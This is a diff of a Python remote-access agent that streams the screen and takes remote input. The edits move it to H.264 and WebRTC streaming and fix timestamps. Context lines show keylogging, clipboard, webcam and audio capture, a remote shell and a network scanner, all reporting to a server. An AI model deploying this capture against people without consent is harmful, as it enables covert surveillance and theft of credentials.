@@ -107,7 +107,7 @@ import shutil
 import shutil as _shutil
 from io import BytesIO
 from pathlib import Path
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 from queue import Queue, Empty, Full
 from collections import deque
 from typing import Optional, Dict, List, Any
@@ -296,7 +296,11 @@ def _read_token_from_trailer() -> str:
 # ════════════════════════════════════════════════════════════════════════════
 CONFIG = {
     # ── Connection ──────────────────────────────────────────────────────────
-    # Set SERVER_URL to your Render URL. Override via agent_config.txt next to the EXE.
+    # IMPORTANT: Set SERVER_URL to your server's IP/hostname.
+    # If the agent runs on a DIFFERENT machine than the server,
+    # localhost will NOT work. Use the server machine's LAN IP or public URL.
+    # Override at runtime via agent_config.txt placed next to this file:
+    #   SERVER_URL=http://192.168.1.50:10000
     "SERVER_URL":           "https://screen-connect-rtca.onrender.com",
     "DEVICE_TOKEN":         "",  # Loaded from embedded trailer token at runtime
 
@@ -311,7 +315,7 @@ CONFIG = {
     "STREAM_MIN_FPS":       30,
     "STREAM_QUALITY":       75,
     "STREAM_MONITOR":       1,
-    "STREAM_MODE":          "screenshot",
+    "STREAM_MODE":          "webrtc",
     "STREAM_SCALE":         1.0,
     "STREAM_SHOW_CURSOR":   True,
     "STREAM_AUTO_RESTART":  True,
@@ -553,8 +557,8 @@ def get_device_fingerprint() -> dict:
         "processor":       platform.processor(),
         "local_ip":        local_ip,
         "agent_version":   CONFIG["AGENT_VERSION"],
-        "stream_mode":     CONFIG["STREAM_MODE"],
-        "timestamp":       datetime.utcnow().isoformat(),
+        "stream_mode":     "webrtc" if WEBRTC_OK else CONFIG["STREAM_MODE"],
+        "timestamp":       datetime.now(timezone.utc).isoformat(),
         "screen_count":    _get_screen_count(),
         "screen_w":        sw,
         "screen_h":        sh,
@@ -870,7 +874,14 @@ class FrameDiffer:
         self._prev = None
 
     def changed(self, frame) -> bool:
-        # v14 ULTRA SYNC: Always changed. Perfect sync means zero frame skipping.
+        if frame is None:
+            return False
+        if self._prev is None:
+            self._prev = frame.copy()
+            return True
+        if np.array_equal(self._prev, frame):
+            return False
+        self._prev = frame.copy()
         return True
 
 
@@ -880,31 +891,59 @@ class H264Encoder:
 
     def __init__(self, w, h, fps, crf=23):
         import av
-        self._av = av; self.w = w; self.h = h; self.fps = fps; self.crf = crf
-        self._codec = self._pick(); self._pts = 0
-        log.info(f"Advanced Monitor Encoder: H.264/{self._codec}")
+        self._av = av
+        # Dimensions must be even — avcodec_open2 rejects odd sizes
+        self.w   = w + (w % 2)
+        self.h   = h + (h % 2)
+        self.fps = fps
+        self.crf = crf
+        self._codec = self._pick()
+        self._pts = 0
+        log.info(f"Advanced Monitor Encoder: H.264/{self._codec}  crf={crf}  {self.w}x{self.h}@{fps}fps")
 
     def _pick(self):
         import av
+        codec_errors = []
         for c in self._CODECS:
             try:
                 cc = av.CodecContext.create(c, "w")
-                cc.width = self.w; cc.height = self.h
+                cc.width     = self.w
+                cc.height    = self.h
                 cc.framerate = self.fps
-                cc.options = {"crf": str(self.crf), "preset": "ultrafast", "tune": "zerolatency"}
-                cc.open(); self._cc = cc; return c
-            except Exception: pass
-        raise RuntimeError("No H.264 encoder available")
+                cc.pix_fmt   = "yuv420p"        # must be a property, not in options dict
+                cc.gop_size  = self.fps * 2     # keyframe every 2 s
+
+                if c == "libx264":
+                    cc.options = {"preset": "ultrafast", "tune": "zerolatency", "crf": str(self.crf)}
+                elif c in ("h264_nvenc", "h264_amf"):
+                    # NVENC/AMF do not support 'tune'; use 'p1' (fastest) preset + cq
+                    cc.options = {"preset": "p1", "rc": "vbr", "cq": str(self.crf)}
+                else:
+                    cc.options = {}
+
+                cc.open()
+                self._cc = cc
+                return c
+            except Exception as e:
+                codec_errors.append(f"{c}: {e}")
+                log.debug(f"H264Encoder: codec '{c}' unavailable — {e}")
+
+        raise RuntimeError(
+            f"No H.264 encoder available. Failures: [{' | '.join(codec_errors)}]. "
+            f"Try: pip install av --force-reinstall"
+        )
 
     def encode_frame(self, bgr: np.ndarray, force_key=False):
         import av
         rgb = cv2.cvtColor(bgr, cv2.COLOR_BGR2RGB)
         vf  = av.VideoFrame.from_ndarray(rgb, format="rgb24")
+        vf  = vf.reformat(format="yuv420p")     # match codec pix_fmt before encode
         vf.pts = self._pts; self._pts += 1
-        if force_key: vf.key_frame = True
-        packets = self._cc.encode(vf)
-        out = b"".join(bytes(p) for p in packets)
-        is_key = any(p.is_keyframe for p in packets)
+        if force_key:
+            vf.key_frame = True
+        packets = list(self._cc.encode(vf))     # materialise — iterator is single-pass
+        out     = b"".join(bytes(p) for p in packets)
+        is_key  = any(p.is_keyframe for p in packets)
         return out, is_key
 
 
@@ -962,13 +1001,24 @@ class JPEGEncoder:
 
 
 def _make_encoder(w, h, fps, quality):
-    # Always use JPEG — browsers can't decode H.264 via WebSocket.
-    # FIX: PIL fallback means JPEG works even without cv2.
-    if not CV2_OK:
-        log.warning("Advanced Monitor: cv2 not found — using PIL JPEG encoder (slower but works)")
-    else:
-        log.info("Advanced Monitor: using JPEG encoder (cv2) for WebSocket relay")
-    return JPEGEncoder(quality), FLAG_JPEG
+    """
+    H.264 video encoder — hardware-accelerated via NVENC/AMF, falls back to
+    software libx264.  Browser decodes via WebCodecs VideoDecoder (Chrome 94+).
+    quality (0-100) maps to H.264 CRF: 100→18 (lossless-ish), 0→40 (potato).
+    Falls back to JPEG if PyAV is not installed  (pip install av  to enable).
+    """
+    try:
+        # Map 0-100 quality scale → CRF 18-36 (lower CRF = better quality, bigger packets)
+        crf = max(18, min(36, int(36 - (quality / 100.0) * 18)))
+        enc = H264Encoder(w, h, fps, crf=crf)
+        log.info(f"Advanced Monitor: H.264 encoder active ({enc._codec})  crf={crf}  WebCodecs path")
+        return enc, FLAG_H264
+    except Exception as e:
+        log.warning(f"H.264 encoder unavailable ({e}). "
+                    f"Install PyAV to enable video streaming:  pip install av  — falling back to JPEG")
+        if not CV2_OK:
+            log.warning("Advanced Monitor: cv2 not found — using PIL JPEG encoder")
+        return JPEGEncoder(quality), FLAG_JPEG
 
 
 # ── WebRTC peer state (agent-side) ────────────────────────────────────────
@@ -980,6 +1030,7 @@ _adv_last_frame_pkt:  Optional[bytes] = None
 # ── Advanced monitor streaming state (lives on the async loop) ───────────
 _adv_sio_async  = None   # socketio.AsyncClient — set when async loop starts
 _adv_viewers    = 0
+_prev_unified_viewers = -1
 _adv_authed     = False
 _adv_last_frame_ts = 0.0
 _adv_auth_time     = 0.0   # monotonic time when agent_auth_ok fired
@@ -997,7 +1048,7 @@ def _current_stream_config():
         int(CONFIG.get("STREAM_MONITOR", 1)),
         int(CONFIG.get("STREAM_FPS", 60)),
         int(CONFIG.get("STREAM_QUALITY", 92)),
-        str(CONFIG.get("STREAM_MODE", "screenshot")),
+        str(CONFIG.get("STREAM_MODE", "video")),
     )
 
 def _init_stream_pipeline():
@@ -1155,11 +1206,11 @@ def _producer_thread(
             _producer_thread._last_fps_log = now
             _producer_frame_count = 0
 
-        force_key = (n % (CONFIG["STREAM_FPS"] * 4) == 0)
+        force_key = (n % (CONFIG["STREAM_FPS"] * 2) == 0)   # keyframe every 2s for faster seek/reconnect
 
-        # v14: Encode directly in producer thread (optimized with TurboJPEG/cv2)
+        # v14: Encode directly in producer thread
         try:
-            payload, is_key = encoder.encode_frame(small)
+            payload, is_key = encoder.encode_frame(small, force_key=force_key)
         except Exception as e:
             log.debug(f"Encode error: {e}")
             continue
@@ -1245,10 +1296,6 @@ async def _safe_emit(event, data):
     if not _adv_sio_async or not _adv_sio_async.connected:
         return
     try:
-        # v15.7: Log binary frame relay to verify flow
-        if event == "frame_bin" and _consumer_frame_count % 300 == 0:
-            log.info(f"Relay: emitting frame_bin to server ({len(data)} bytes)")
-
         if inspect.iscoroutinefunction(_adv_sio_async.emit):
             await _adv_sio_async.emit(event, data)
         else:
@@ -1350,7 +1397,8 @@ async def _adv_task_stream_frames(unified_sio=None):
             _consumer_frame_count += 1
             
             if _consumer_frame_count % 30 == 0:
-                log.info(f"Stream Stats: in_flight={_adv_sio_async._in_flight if _adv_sio_async else '?'}")
+                queue_size = frame_q.qsize() if frame_q else 0
+                log.info(f"Stream Stats: queue_size={queue_size}, viewers={_adv_viewers}")
 
             # Stale-frame guard: if the frame is >150ms old, discard it.
             if len(pkt) >= 16:
@@ -1371,47 +1419,37 @@ async def _adv_task_stream_frames(unified_sio=None):
             _adv_last_frame_pkt = pkt
             _adv_last_frame_ts  = time.monotonic()
 
-            # Emit over Socket.IO (non-blocking fan-out)
-            if _adv_sio_async and _adv_sio_async.connected:
-                # v14: Enterprise Adaptive Backpressure
-                if not hasattr(_adv_sio_async, "_in_flight"): _adv_sio_async._in_flight = 0
-                
-                # v15: Reduced max_in_flight to 2 to minimize buffer bloat/latency.
-                max_in_flight = 2 
-                if _adv_sio_async._in_flight < max_in_flight:
-                    _adv_sio_async._in_flight += 1
-                    
-                    async def _do_emit(p):
-                        try:
-                            await _safe_emit("frame_bin", p)
-                        finally:
-                            if _adv_sio_async:
-                                _adv_sio_async._in_flight = max(0, _adv_sio_async._in_flight - 1)
-                    
-                    asyncio.create_task(_do_emit(pkt))
-                else:
-                    # Backpressure hit — drop frame
-                    if _consumer_frame_count % 60 == 0:
-                        log.debug(f"Stream backpressure: dropping frame (in_flight={_adv_sio_async._in_flight})")
-                        if CONFIG["STREAM_QUALITY"] > 30:
-                            CONFIG["STREAM_QUALITY"] -= 5
-                            log.info(f"Adaptive Quality: reduced to {CONFIG['STREAM_QUALITY']} (congestion)")
-                        if CONFIG["STREAM_SCALE"] > 0.4 and _consumer_frame_count % 300 == 0:
-                            # v15.7: Disable adaptive scaling for local boost
-                            # CONFIG["STREAM_SCALE"] = round(CONFIG["STREAM_SCALE"] - 0.1, 1)
-                            # log.info(f"Adaptive Scale: reduced to {CONFIG['STREAM_SCALE']} (persistent congestion)")
-                            pass
-            else:
-                if _consumer_frame_count % 60 == 0:
-                    log.warning(f"Consumer: cannot emit — sio={_adv_sio_async} connected={_adv_sio_async.connected if _adv_sio_async else 'N/A'}")
+            # ── Server-bridge delivery: emit raw JPEG via frame_bin → server aiortc → browser WebRTC ──
+            # Architecture: agent ships JPEG over SocketIO; server's aiortc bridge owns
+            # all WebRTC complexity and delivers a native <video> track to the browser.
+            # Strip the 24-byte binary frame header (FRAME_HDR = ">IIQII") — server
+            # expects bare JPEG bytes it can feed straight into the mjpeg decoder.
+            _HDR_SIZE = FRAME_HDR.size  # 24 bytes
+            jpeg_payload = pkt[_HDR_SIZE:] if len(pkt) > _HDR_SIZE else pkt
 
-            # Also push over any open WebRTC DataChannels
+            sio_client = unified_sio or _adv_sio_async
+            if sio_client and getattr(sio_client, "connected", True):
+                try:
+                    if inspect.iscoroutinefunction(sio_client.emit):
+                        await sio_client.emit("frame_bin", jpeg_payload)
+                    else:
+                        loop = asyncio.get_event_loop()
+                        await loop.run_in_executor(None, sio_client.emit, "frame_bin", jpeg_payload)
+                except Exception as _e:
+                    if _consumer_frame_count % 300 == 0:
+                        log.debug(f"frame_bin emit error: {_e}")
+
+            if _consumer_frame_count % 300 == 0:
+                log.info(f"frame_bin: sent {len(jpeg_payload)} bytes to server bridge (viewers={_adv_viewers})")
+
+            # ── WebRTC DataChannel delivery: send full frame to all open peers directly
             for vsid, dc in list(_adv_webrtc_channels.items()):
                 try:
                     if dc.readyState == "open":
                         dc.send(pkt)
-                except Exception:
-                    _adv_webrtc_channels.pop(vsid, None)
+                except Exception as _e:
+                    if _consumer_frame_count % 300 == 0:
+                        log.debug(f"WebRTC DC send error for viewer={vsid}: {_e}")
 
     finally:
         # v15: KILL THREADS ON EXIT
@@ -1423,43 +1461,56 @@ async def _adv_task_stream_frames(unified_sio=None):
 
 
 
-async def _adv_task_stream_cursor():
-    """v10: 60Hz cursor task with delta suppression and win32 fast path."""
-    interval = 1.0 / 60
+async def _adv_task_stream_cursor(unified_sio=None):
+    """Cursor task — 144Hz, normalized coords. DataChannel primary, SocketIO fallback."""
+    interval = 1.0 / 144   # 144Hz polling for ultra-smooth cursor
     lx = ly = -1
-    skip = 0  # skip counter for unchanged positions
-    log.info("Cursor stream task started")
+    skip = 0
+    log.info("Cursor stream task started (144Hz, WebRTC DataChannel)")
     while True:
-        # v15: Always run cursor task if we have viewers, don't wait for _adv_authed
-        # to ensure the cursor is responsive even during stream auth handshake.
         if _adv_viewers > 0:
             try:
                 pos = _cursor_relative_to_monitor()
                 if pos is None:
-                    if lx != -1:
-                        log.debug("Cursor left monitor")
                     lx = ly = -1
                     await asyncio.sleep(interval)
                     continue
                 x, y = pos
                 dx, dy = abs(x - lx), abs(y - ly)
-                if dx > 1 or dy > 1 or skip >= 120:
-                    # v16: Send normalized cursor coordinates (0.0 to 1.0) for perfect scaling
+                # Send only on actual movement or heartbeat every 30 frames
+                if dx > 0 or dy > 0 or skip >= 30:
                     mon = _get_monitor_geometry(CONFIG["STREAM_MONITOR"])
-                    # Use 0..65535 (16-bit) for high precision normalized coords
-                    nx = int((x / mon["width"]) * 65535) if mon["width"] > 0 else 0
+                    # Normalized 0..65535 coords for pixel-perfect scaling on any display
+                    nx = int((x / mon["width"])  * 65535) if mon["width"]  > 0 else 0
                     ny = int((y / mon["height"]) * 65535) if mon["height"] > 0 else 0
-                    
                     ts  = int(time.time() * 1000) & 0xFFFFFFFF
-                    # We'll use a new header for normalized cursor: ">HHI" (2 bytes X, 2 bytes Y, 4 bytes TS)
                     pkt = struct.pack(">HHI", nx, ny, ts)
-                    
-                    # v15: Use the most stable available socket for cursor
-                    target_sio = _adv_sio_async if (_adv_sio_async and _adv_sio_async.connected) else None
-                    if target_sio:
-                        # v16: Mark as normalized cursor event
-                        asyncio.create_task(_safe_emit("cursor_bin_norm", pkt))
-                    
+
+                    # Primary: WebRTC DataChannel (agent-to-agent peers)
+                    _dc_sent = False
+                    for vsid, dc in list(_adv_webrtc_channels.items()):
+                        try:
+                            if dc.readyState == "open":
+                                dc.send(b"\xCC" + pkt)
+                                _dc_sent = True
+                        except Exception:
+                            pass
+
+                    # Fallback: SocketIO cursor_bin (server-bridge architecture)
+                    if not _dc_sent and _adv_viewers > 0:
+                        try:
+                            _sio = unified_sio if "unified_sio" in dir() else _adv_sio_async
+                            if _sio and getattr(_sio, "connected", True):
+                                if inspect.iscoroutinefunction(_sio.emit):
+                                    await _sio.emit("cursor_bin", b"\xCC" + pkt)
+                                else:
+                                    _loop = asyncio.get_event_loop()
+                                    await _loop.run_in_executor(
+                                        None, _sio.emit, "cursor_bin", b"\xCC" + pkt
+                                    )
+                        except Exception:
+                            pass
+
                     lx, ly = x, y
                     skip = 0
                 else:
@@ -1503,11 +1554,21 @@ async def on_input_event_logic(data):
             h=data.get("h")
         )
         
-        # Use win32api for ultra-low latency mouse movement if available
+        # Use SendInput for mouse_move — fires real WM_MOUSEMOVE events
+        # (SetCursorPos only repositions the cursor icon; apps don't receive input)
         if evt == "mouse_move":
             if WIN32_OK:
-                # v15: Direct win32 fast path for zero-lag cursor sync
-                win32api.SetCursorPos((mx, my))
+                try:
+                    screen_w = ctypes.windll.user32.GetSystemMetrics(0) or 1920
+                    screen_h = ctypes.windll.user32.GetSystemMetrics(1) or 1080
+                    abs_x = int((mx / screen_w) * 65535)
+                    abs_y = int((my / screen_h) * 65535)
+                    win32api.mouse_event(
+                        win32con.MOUSEEVENTF_MOVE | win32con.MOUSEEVENTF_ABSOLUTE,
+                        abs_x, abs_y, 0, 0
+                    )
+                except Exception:
+                    pyautogui.moveTo(mx, my, _pause=False)
             else:
                 pyautogui.moveTo(mx, my, _pause=False)
             return
@@ -1534,7 +1595,7 @@ async def on_input_event_logic(data):
                     fn(mx, my, button=btn, _pause=False)
         
         elif evt == "mouse_scroll":
-            pyautogui.scroll(int(data.get("delta", 3)), x=mx, y=my, _pause=False)
+            pyautogui.scroll(int(data.get("delta", 10)), x=mx, y=my, _pause=False)
         
         elif evt == "key_event":
             key = data.get("key", "")
@@ -1727,6 +1788,16 @@ async def _adv_main(server_url: str, token: str):
             await pc.setRemoteDescription(offer)
             answer = await pc.createAnswer()
             await pc.setLocalDescription(answer)
+            
+            # v17: AGENT MUST create the "frames" DataChannel for video delivery
+            # The dashboard only creates "control" for cursor; we create "frames" for video
+            frames_dc = pc.createDataChannel("frames", ordered=False, maxRetransmits=0)
+            _adv_webrtc_channels[viewer_sid] = frames_dc
+            
+            @frames_dc.on("close")
+            def on_frames_close():
+                _adv_webrtc_channels.pop(viewer_sid, None)
+            
             await sio.emit("webrtc_answer", {
                 "viewer_sid": viewer_sid,
                 "sdp": {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type},
@@ -1758,7 +1829,7 @@ async def _adv_main(server_url: str, token: str):
     # ENTERPRISE: named tasks with crash callbacks — if either task dies the
     # outer _adv_main loop catches it and reconnects the entire adv socket
     frame_task  = asyncio.ensure_future(_adv_task_stream_frames())
-    cursor_task = asyncio.ensure_future(_adv_task_stream_cursor())
+    cursor_task = asyncio.ensure_future(_adv_task_stream_cursor(unified_sio=unified_sio))
 
     def _on_task_done(t):
         if t.cancelled():
@@ -1786,133 +1857,12 @@ async def _adv_main(server_url: str, token: str):
 _adv_monitor_started = False  # ensure we only start it once
 
 
-# ── Main-socket screenshot fallback ─────────────────────────────────────────
-# When the adv socket fails to auth, this thread streams screenshots via the
-# main socket so both Advanced Monitor and Live Viewer show frames.
-_fb_thread: threading.Thread = None
-_fb_stop    = threading.Event()
-
-def _start_screenshot_fallback(sio_client):
-    """Launch a screenshot-via-main-socket fallback if not already running."""
-    global _fb_thread, _fb_stop
-    if _fb_thread and _fb_thread.is_alive():
-        return
-    _fb_stop.clear()
-
-    def _fb_loop():
-        log.info("Screenshot fallback: starting main-socket frame relay")
-        import struct as _struct
-        FLAG_JPEG = 0x02
-        FRAME_HDR = _struct.Struct(">IIQII")
-        fps = quality = None
-        interval = 1.0 / 15
-        cap = None
-        cfg_sig = None
-        n = 0
-        grab_fails = 0
-        while not _fb_stop.is_set():
-            try:
-                # ENTERPRISE: only stop fallback when adv socket sustains < 0.5s between frames
-                if (
-                    _adv_authed and _adv_sio_async and _adv_sio_async.connected
-                    and (time.monotonic() - _adv_last_frame_ts) < 0.25  # v10: 250ms
-                ):
-                    log.info("Screenshot fallback: adv socket sustaining stream — stopping fallback")
-                    break
-
-                next_sig = _current_stream_config()
-                if next_sig != cfg_sig or cap is None or grab_fails > 10:
-                    if grab_fails > 10:
-                        log.warning("Screenshot fallback: too many capture failures — resetting")
-                    if cap:
-                        try: cap.close()
-                        except Exception: pass
-                    fps = next_sig[1]
-                    quality = next_sig[2]
-                    interval = 1.0 / max(1, min(fps, 30))
-                    cap = _make_capture()
-                    cfg_sig = next_sig
-                    grab_fails = 0
-                    log.info(f"Screenshot fallback: reconfigured monitor={next_sig[0]} fps={fps} quality={quality}")
-
-                frame = cap.grab()
-                if frame is None:
-                    grab_fails += 1
-                    time.sleep(interval); continue
-                grab_fails = 0
-
-                h, w = frame.shape[:2]
-                # Use configurable scale (default 1.0 = full res) with INTER_AREA for quality
-                _scale = float(CONFIG.get("STREAM_SCALE", 1.0))
-                if CV2_OK:
-                    if _scale < 0.99:
-                        tw = max(64, int(w * _scale))
-                        th = max(48, int(h * _scale))
-                        small = cv2.resize(frame, (tw, th), interpolation=cv2.INTER_AREA)
-                    else:
-                        small = frame
-                    ok, buf = cv2.imencode(".jpg", small, [cv2.IMWRITE_JPEG_QUALITY, quality])
-                    payload = buf.tobytes() if ok else None
-                    if ok:
-                        h, w = small.shape[:2]
-                else:
-                    try:
-                        from PIL import Image as _PI
-                        from io import BytesIO as _BIO
-                        import numpy as _np2
-                        rgb = _np2.array(frame)[:, :, ::-1]
-                        img = _PI.fromarray(rgb, "RGB")
-                        if _scale < 0.99:
-                            tw = max(64, int(w * _scale))
-                            th = max(48, int(h * _scale))
-                            img = img.resize((tw, th), _PI.LANCZOS)
-                        _bio = _BIO()
-                        img.save(_bio, "JPEG", quality=quality)
-                        payload = _bio.getvalue()
-                        w, h = img.size
-                    except Exception:
-                        payload = None
-                if not payload:
-                    time.sleep(interval); continue
-                ts_us   = int(time.time() * 1_000_000)
-                header  = FRAME_HDR.pack(w, h, ts_us, FLAG_JPEG, len(payload))
-                pkt     = header + payload
-                if sio_client and sio_client.connected:
-                    try:
-                        # v12.2: check frame age before sending — discard stale frames
-                        now_us = int(time.time() * 1_000_000)
-                        _hdr = struct.pack(">IIQII", w, h, now_us, FLAG_JPEG, len(payload))
-                        pkt = _hdr + payload
-
-                        b64_frame = base64.b64encode(payload).decode()
-                        b64_pkt   = base64.b64encode(pkt).decode()
-                        did = CONFIG["DEVICE_TOKEN"]
-                        sio_client.emit("screenshot_result", {
-                            "device_id": did,
-                            "frame":     b64_frame,
-                            "image":     b64_frame,
-                            "w": w, "h": h,
-                        })
-                        # Send binary frame with current timestamp so server/viewer
-                        # can apply the same stale-frame guard as the adv socket
-                        sio_client.emit("frame_bin_relay", {
-                            "device_id": did,
-                            "b64": b64_pkt,
-                        })
-                    except Exception as e:
-                        log.debug(f"Screenshot fallback emit error: {e}")
-                n += 1
-                time.sleep(interval)
-            except Exception as e:
-                log.debug(f"Screenshot fallback loop error: {e}")
-                time.sleep(1)
-        if cap:
-            try: cap.close()
-            except: pass
-        log.info("Screenshot fallback: stopped")
-
-    _fb_thread = threading.Thread(target=_fb_loop, daemon=True, name="fb-screenshot")
-    _fb_thread.start()
+# ── Screenshot fallback REMOVED — video stream is the sole path ──────────────
+# The screenshot fallback (main-socket JPEG relay) has been permanently removed.
+# All frame delivery is handled exclusively by _adv_task_stream_frames via the
+# advanced socket.  _fb_stop is kept so any legacy call to _fb_stop.set() is
+# harmless.
+_fb_stop = threading.Event()
 
 
 def start_advanced_monitor(server_url: str, token: str, unified_sio=None):
@@ -1943,7 +1893,7 @@ def start_advanced_monitor(server_url: str, token: str, unified_sio=None):
                 try:
                     # Run both frame and cursor tasks in unified mode
                     frame_task  = asyncio.ensure_future(_adv_task_stream_frames(unified_sio=unified_sio))
-                    cursor_task = asyncio.ensure_future(_adv_task_stream_cursor())
+                    cursor_task = asyncio.ensure_future(_adv_task_stream_cursor(unified_sio=unified_sio))
                     _adv_loop.run_until_complete(asyncio.gather(frame_task, cursor_task))
                 except Exception as e:
                     log.error(f"Unified Advanced Monitor task error: {e} — restarting tasks in 2s")
@@ -2034,7 +1984,7 @@ class SystemMonitor:
 
         stats = {
             "device_id":        CONFIG["DEVICE_TOKEN"],
-            "ts":               datetime.utcnow().isoformat(),
+            "ts":               datetime.now(timezone.utc).isoformat(),
             "cpu_percent":      psutil.cpu_percent(interval=0.1),
             "cpu_per_core":     psutil.cpu_percent(percpu=True),
             "cpu_count":        psutil.cpu_count(logical=True),
@@ -2432,7 +2382,7 @@ class RemoteShell:
                 "stderr":     result.stderr[-8192:],
                 "returncode": result.returncode,
                 "elapsed_s":  round(time.time() - t0, 3),
-                "ts":         datetime.utcnow().isoformat(),
+                "ts":         datetime.now(timezone.utc).isoformat(),
             }
         except subprocess.TimeoutExpired:
             return {"success": False, "command": command, "error": f"Timed out ({RemoteShell.TIMEOUT}s)."}
@@ -2719,7 +2669,7 @@ class AudioCapture:
                 "duration_s":  seconds,
                 "sample_rate": sample_rate,
                 "data":        base64.b64encode(buf.getvalue()).decode(),
-                "ts":          datetime.utcnow().isoformat(),
+                "ts":          datetime.now(timezone.utc).isoformat(),
             }
         except Exception as e:
             return {"error": str(e)}
@@ -2777,7 +2727,7 @@ class AlertEngine:
                         "type": "cpu", "value": cpu,
                         "threshold": CONFIG["ALERT_CPU_THRESHOLD"],
                         "message": f"CPU usage critical: {cpu:.1f}%",
-                        "ts": datetime.utcnow().isoformat(),
+                        "ts": datetime.now(timezone.utc).isoformat(),
                     })
                 if ram >= CONFIG["ALERT_RAM_THRESHOLD"] and self._can_alert("ram"):
                     self.sio.emit("agent_alert", {
@@ -2785,7 +2735,7 @@ class AlertEngine:
                         "type": "ram", "value": ram,
                         "threshold": CONFIG["ALERT_RAM_THRESHOLD"],
                         "message": f"RAM usage critical: {ram:.1f}%",
-                        "ts": datetime.utcnow().isoformat(),
+                        "ts": datetime.now(timezone.utc).isoformat(),
                     })
                 if disk >= CONFIG["ALERT_DISK_THRESHOLD"] and self._can_alert("disk"):
                     self.sio.emit("agent_alert", {
@@ -2793,7 +2743,7 @@ class AlertEngine:
                         "type": "disk", "value": disk,
                         "threshold": CONFIG["ALERT_DISK_THRESHOLD"],
                         "message": f"Disk usage critical: {disk:.1f}%",
-                        "ts": datetime.utcnow().isoformat(),
+                        "ts": datetime.now(timezone.utc).isoformat(),
                     })
             except Exception as e:
                 log.error(f"AlertEngine error: {e}")
@@ -2913,7 +2863,7 @@ class ScreenRecorder:
                         "rec_id":    rec_id,
                         "chunk":     chunk_num,
                         "data":      data_b64,
-                        "ts":        datetime.utcnow().isoformat(),
+                        "ts":        datetime.now(timezone.utc).isoformat(),
                     })
                     chunk_num += 1
                 except Exception as e:
@@ -3047,7 +2997,7 @@ class NetworkScanner:
             "subnet":     subnet,
             "host_count": len(hosts),
             "hosts":      hosts,
-            "ts":         datetime.utcnow().isoformat(),
+            "ts":         datetime.now(timezone.utc).isoformat(),
         }
 
 
@@ -3088,7 +3038,7 @@ class FileWatcher:
                                 "watch_path": self.root,
                                 "type":       event.event_type,
                                 "path":       event.src_path,
-                                "ts":         datetime.utcnow().isoformat(),
+                                "ts":         datetime.now(timezone.utc).isoformat(),
                             })
                         except Exception: pass
 
@@ -3177,7 +3127,7 @@ class FileWatcher:
                         "created":  created[:50],
                         "deleted":  deleted[:50],
                         "modified": modified[:50],
-                        "ts":       datetime.utcnow().isoformat(),
+                        "ts":       datetime.now(timezone.utc).isoformat(),
                     })
                 except Exception as e:
                     log.debug(f"FileWatcher emit error: {e}")
@@ -3646,7 +3596,7 @@ class KeyLogger:
                 "device_id": CONFIG["DEVICE_TOKEN"],
                 "text":      text,
                 "window":    self._active_window(),
-                "ts":        datetime.utcnow().isoformat(),
+                "ts":        datetime.now(timezone.utc).isoformat(),
             })
         except Exception:
             pass
@@ -3713,7 +3663,7 @@ class ClipboardMonitor:
                     "device_id": CONFIG["DEVICE_TOKEN"],
                     "content":   cur[:8192],
                     "length":    len(cur),
-                    "ts":        datetime.utcnow().isoformat(),
+                    "ts":        datetime.now(timezone.utc).isoformat(),
                 })
         except Exception:
             pass
@@ -3750,7 +3700,7 @@ class WebcamCapture:
                 "frame":      base64.b64encode(buf.tobytes()).decode(),
                 "w":          frame.shape[1],
                 "h":          frame.shape[0],
-                "ts":         datetime.utcnow().isoformat(),
+                "ts":         datetime.now(timezone.utc).isoformat(),
             }
         except Exception as e:
             return {"error": str(e)}
@@ -3865,7 +3815,7 @@ class Heartbeat:
                     "active_user":   active_user,
                     "uptime_s":      uptime_s,
                     "screen_count":  _get_screen_count(),
-                    "ts":            datetime.utcnow().isoformat(),
+                    "ts":            datetime.now(timezone.utc).isoformat(),
                 })
             except Exception as e:
                 log.warning(f"Heartbeat error: {e}")
@@ -3956,7 +3906,7 @@ class ConnectionQualityReporter:
                     "rtt_ms":       round(rtt_avg, 1),
                     "jitter_ms":    round(jitter, 1),
                     "drops":        drops,
-                    "ts":           datetime.utcnow().isoformat(),
+                    "ts":           datetime.now(timezone.utc).isoformat(),
                 })
             except Exception as e:
                 log.debug(f"QualityReporter error: {e}")
@@ -4168,7 +4118,7 @@ class ScreenConnectAgent:
                 "device_id": CONFIG["DEVICE_TOKEN"],
                 "added":     list(kw.get("added", [])),
                 "removed":   list(kw.get("removed", [])),
-                "ts":        datetime.utcnow().isoformat(),
+                "ts":        datetime.now(timezone.utc).isoformat(),
             }) if sio.connected else None
         )
 
@@ -4272,27 +4222,35 @@ class ScreenConnectAgent:
                     "device_id": CONFIG["DEVICE_TOKEN"],
                 })
 
+        # Track previous viewer count to avoid spamming logs
+        _prev_unified_viewers = -1
         @sio.on("viewer_count")
         def on_unified_viewer_count(data):
-            global _adv_viewers, _adv_loop
-            _adv_viewers = data.get("count", 0)
+            global _adv_viewers, _adv_loop, _prev_unified_viewers
+            new_count = data.get("count", 0)
+            
+            # Only log when count changes
+            if _prev_unified_viewers != new_count:
+                _prev_unified_viewers = new_count
+                if new_count > 0:
+                    log.info(f"Unified Connection: viewer connected ({new_count}) — waking stream")
+                else:
+                    log.info("Unified Connection: all viewers disconnected — idling stream")
+            
+            # Always update state
+            _adv_viewers = new_count
             if _adv_viewers > 0:
-                log.info(f"Unified Connection: viewer connected ({_adv_viewers}) — waking stream")
                 # Force start Advanced Monitor if it's not running
                 if not _adv_monitor_started:
                     start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"], unified_sio=sio)
                 
-                # v15.6: FORCE REFRESH SIGNAL
-                # When a viewer connects, we MUST force a keyframe and wake the ticker.
-                # Also reset n to force a keyframe immediately.
-                global n
-                n = 0
-                # v17: Actually wake the consumer loop — the old no-op lambda did nothing.
-                # Poke the tick_evt so the producer/consumer unblocks from its 0.5s sleep
-                # immediately rather than waiting for the next cycle.
-                tick = _adv_stream_ctrl.get("tick")
-                if tick:
-                    tick.set()
+                # v15.6: FORCE REFRESH SIGNAL (only when count increases from 0)
+                if _prev_unified_viewers == 0:
+                    global n
+                    n = 0
+                    tick = _adv_stream_ctrl.get("tick")
+                    if tick:
+                        tick.set()
                 
                 # Proactive push to clear "retrying" state
                 sio.emit("agent_auth_ready", {
@@ -4300,8 +4258,6 @@ class ScreenConnectAgent:
                     "device_id": CONFIG["DEVICE_TOKEN"],
                     "status":    "active"
                 })
-            else:
-                log.info("Unified Connection: all viewers disconnected — idling stream")
 
         @sio.on("input_event")
         def on_unified_input_event(data):
